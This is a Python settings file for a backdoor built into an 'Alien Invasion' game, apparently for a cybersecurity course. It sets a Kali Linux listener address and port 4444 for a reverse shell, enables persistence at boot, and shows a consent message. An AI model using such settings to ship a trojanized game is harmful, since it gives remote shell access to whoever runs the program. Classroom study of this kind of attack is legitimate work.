"""
Configuration file for backdoor settings
Modify these settings for your testing environment
"""

# Listener configuration
# IMPORTANT: Change this to your Kali Linux IP address before building .exe
LISTENER_HOST = '10.12.72.171'  # Change to your Kali Linux IP address
LISTENER_PORT = 4444

# Feature flags
ENABLE_BACKDOOR = True  # Set to False to disable backdoor functionality
ENABLE_PERSISTENCE = True  # Set to False to disable persistence
SHOW_CONSENT_DIALOG = True  # Show user consent before installing

# Consent message
CONSENT_MESSAGE = """
╔════════════════════════════════════════════════════════════╗
║           ALIEN INVASION - SECURITY DEMONSTRATION          ║
╔════════════════════════════════════════════════════════════╗

EDUCATIONAL CYBERSECURITY DEMONSTRATION

This game includes backdoor functionality for educational 
purposes as part of a cybersecurity course assignment.

By running this game, you consent to:
  • Installation of required dependencies
  • Background network connection to demonstrate backdoor
  • Persistence mechanism (auto-start on boot)
  • Shell access for educational demonstration

This is for EDUCATIONAL PURPOSES ONLY in a controlled VM.

Do you consent to proceed?
"""